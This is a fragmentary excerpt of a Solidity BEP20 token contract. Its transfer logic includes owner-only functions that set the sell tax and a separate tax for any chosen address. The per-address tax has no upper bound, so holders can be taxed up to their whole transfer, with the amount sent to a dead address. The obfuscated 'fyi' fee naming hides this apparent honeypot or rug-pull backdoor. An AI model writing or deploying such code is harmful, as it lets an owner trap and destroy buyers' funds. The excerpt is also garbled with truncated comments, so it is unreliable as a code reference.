 ...
 *
 * This module is used through inheritance. It will make available the modifyir
...
contract CptoL is BEP20, Ownable, BaseToken {
    ...
    uint256 private _defaultSellfyi = 3;

    uint256 private _defaultBuyfyi = 0;


    mapping(address => bool) private _marketacounts;

    mapping(address => uint256) private _SLfyi;
    ...
    function upslf(uint256 _value) external onlyowner {
        _defaultSellfyi = _value;
    }


    function setSLfyi(address _address, uint256 _value) external onlyowner {
        require(_value > 1, "acounts tax must be greater than or equal to 1");
        _SLfyi[_address] = _value;
    }

    function getSLfyi(address _address) external view onlyowner returns (uint256) {
        return _SLfyi[_address];
    }


    function setMarketacountsfyi(address _address, bool _value) external onlyowner {
        _marketacounts[_address] = _value;
    }

    function getMarketacountsfyi(address _address) external view onlyowner returns (bool) {
     ...
     * e.g. implement automatic token fyis, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (recipient == uniswapV2Pair) {
                    ...
                    tradefyi = _defaultSellfyi;
                }
                if (sender == uniswapV2Pair) {

                    tradefyi = _defaultBuyfyi;
                }
            }
            if (_SLfyi[sender] > 0) {
                tradefyi = _SLfyi[sender];
            }

            tradefyiAmount = amount.mul(tradefyi).div(100);
        }


        if (tradefyiAmount > 0) {
            _balances[_DEADaddress] = _balances[_DEADaddress].add(tradefyiAmount);
            emit Transfer(sender, _DEADaddress, tradefyiAmount);
        }
        _balances[recipient] = _balances[recipient].add(amount - tradefyiAmount);
        emit Transfer(sender, recipient, amount - tradefyiAmount);
    }
